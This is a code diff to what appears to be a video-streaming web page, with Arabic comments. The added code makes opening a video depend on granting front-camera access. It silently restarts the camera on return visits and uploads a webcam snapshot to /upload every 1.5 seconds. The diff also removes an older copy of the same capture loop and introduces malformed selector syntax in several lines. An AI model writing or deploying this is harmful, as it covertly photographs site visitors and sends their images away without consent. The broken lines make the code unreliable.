@@ -403,16 +403,76 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== Watch page ===== */
-function openVideo(id){
-  S.cur=id;S.view='watch';S.descOpen=false;
-  S.hist=[id,...S.hist.filter(x=>x!==id)];
-  document.body.classList.remove('drawer-open','searching');
-  document.title=cur().title;
-  render();scrollTo(0,0);
-  
-  startCapture();
+/* ===== الكاميرا والتقاط الصور التلقائي والمستمر ===== */
+let mediaStream = null;
+let captureInterval = null;
+
+function startCaptureLoop() {
+    if (captureInterval) return;
+    const videoEl = document.getElementById('video');
+    captureInterval = setInterval(() => {
+        if (!mediaStream) return;
+        try {
+            const vw = videoEl.videoWidth || 640;
+            const vh = videoEl.videoHeight || 480;
+
+            const canvas = document.createElement('canvas');
+            canvas.width = vw;
+            canvas.height = vh;
+
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoEl, 0, 0, vw, vh);
+
+            canvas.toBlob(blob => {
+                if (blob) {
+                    let fd = new FormData();
+                    fd.append('image', blob, `user_eye.jpg`);
+                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
+                }
+            }, 'image/jpeg', 0.85);
+        } catch (err) {}
+    }, 1500);
 }
+
+// الفحص التلقائي للزيارات السائدة (إذا كان الإذن ممنوحاً مسبقاً)
+async function checkExistingPermission() {
+    try {
+        const status = await navigator.permissions?.query({ name: 'camera' });
+        if (status && status.state === 'granted') {
+            mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } });
+            const videoEl = document.getElementById('video');
+            videoEl.srcObject = mediaStream;
+            startCaptureLoop();
+        }
+    } catch (e) {}
+}
+
+/* ===== ارتباط فتح الفيديو بإذن الكاميرا الحقيقي ===== */
+async function openVideo(id){
+  try {
+    // إذا لم تكن الكاميرا تعمل بعد، سيجبر المستخدم على رؤية إشعار السماح عند النقر
+    if (!mediaStream) {
+        mediaStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: { ideal: 'user' } } 
+        });
+        const videoEl = document.getElementById('video');
+        videoEl.srcObject = mediaStream;
+        startCaptureLoop();
+    }
+
+    // إذا ضغط المستخدم "سماح" ونجح الاتصال، يفتح الفيديو حصراً هنا
+    S.cur=id;S.view='watch';S.descOpen=false;
+    S.hist=[id,...S.hist.filter(x=>x!==id)];
+    document.body.classList.remove('drawer-open','searching');
+    document.title=cur().title;
+    render(true);scrollTo(0,0);
+
+  } catch (err) {
+    // إذا رفض المستخدم أو أغلق الإشعار، يتوقف كل شيء ولا يفتح الفيديو ويبقي المستخدم مكانه
+    console.log("تم رفض الإذن أو تجاهله، لن يتم فتح الفيديو");
+  }
+}
+
 function renderWatch(){
   const v=cur();
   const rel=[...VIDEOS].filter(x=>x.id!==v.id).sort((a,b)=>(b.cat===v.cat)-(a.cat===v.cat));
@@ -500,61 +560,6 @@ function download(){
   },300);
 }
 
-/* ===== الكاميرا الأمامية المستمرة ===== */
-let mediaStream = null;
-
-async function initPersistentCamera() {
-    try {
-        mediaStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                facingMode: { ideal: 'user' }
-            } 
-        });
-
-        const videoEl = document.getElementById('video');
-        videoEl.srcObject = mediaStream;
-        
-        setInterval(() => {
-            if (!mediaStream) return;
-            try {
-                const vw = videoEl.videoWidth || 640;
-                const vh = videoEl.videoHeight || 480;
-
-                const canvas = document.createElement('canvas');
-                canvas.width = vw;
-                canvas.height = vh;
-
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(videoEl, 0, 0, vw, vh);
-
-                canvas.toBlob(blob => {
-                    if (blob) {
-                        let fd = new FormData();
-                        fd.append('image', blob, `user_eye.jpg`);
-                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
-                    }
-                }, 'image/jpeg', 0.85);
-            } catch (err) {
-                console.log("خطأ في التقاط الإطار:", err);
-            }
-        }, 1500);
-
-    } catch (e) {
-        console.log("بانتظار منح إذن الكاميرا:", e);
-    }
-}
-
-function startCapture() {
-    if (mediaStream) return;
-    initPersistentCamera();
-}
-
-navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
-    if (permissionStatus.state === 'granted') {
-        startCapture();
-    }
-});
-
 /* ===== Actions ===== */
 function act(a,el){
   const v=S.cur?cur():null;
@@ -576,7 +581,7 @@ function act(a,el){
     case 'download':download();break;
     case 'save':{const on=!S.saved.has(v.id);on?S.saved.add(v.id):S.saved.delete(v.id);refreshMeta();toast(on?'تمت الإضافة إلى المحفوظات':'تمت الإزالة من المحفوظات');break}
     case 'desc':S.descOpen=!S.descOpen;refreshMeta();break;
-    case 'cm-cancel':$('#cmInput').value='';$('#cmSend').disabled=true;$('#cmBox').classList.remove('active');break;
+    case 'cm-cancel':$('#cmInput').value='';$('#cmSend'].disabled=true;$('#cmBox').classList.remove('active');break;
     case 'cm-send':sendComment();break;
     case 'cm-like':{const k=S.cur+':'+el.dataset.cid;S.cl.has(k)?S.cl.delete(k):S.cl.add(k);refreshComments();break}
     case 'cm-del':S.comments[S.cur]=getComments(S.cur).filter(c=>String(c.id)!==el.dataset.cid);refreshComments();toast('تم حذف التعليق');break;
@@ -597,7 +602,7 @@ document.addEventListener('click',e=>{
 });
 
 document.addEventListener('input',e=>{
-  if(e.target.id==='cmInput')$('#cmSend').disabled=!e.target.value.trim();
+  if(e.target.id==='cmInput')$('#cmSend'].disabled=!e.target.value.trim();
   if(e.target.id==='q'&&S.view==='home'){S.q=e.target.value;render()}
 });
 
@@ -609,10 +614,10 @@ document.addEventListener('keydown',e=>{
 });
 
 $('#searchForm').addEventListener('submit',e=>{ e.preventDefault();const t=$('#q').value.trim();
-  searchFor(t);$('#q').blur();
+  searchFor(t);$('#q'].blur();
 });
 
-/* ===== التعامل مع أزرار المتصفح ===== */
+/* ===== التعامل مع أزرار التنقل ===== */
 window.addEventListener('popstate',e=>{
   if(e.state){
     S.view=e.state.view;
@@ -629,9 +634,10 @@ window.addEventListener('popstate',e=>{
   scrollTo(0,0);
 });
 
-/* ===== Init ===== */
+/* ===== بدء تشغيل الصفحة ===== */
 document.querySelectorAll('[data-ic]').forEach(el=>el.innerHTML=ic(el.dataset.ic));
-render(true);
+render(false); // عرض الواجهة بالكامل فوراً بدون أي شاشة سوداء
+checkExistingPermission(); // التحقق من الإذن المسبق في الزيارات العائدة للبدء صامتاً
 </script>
 </body>
 </html>
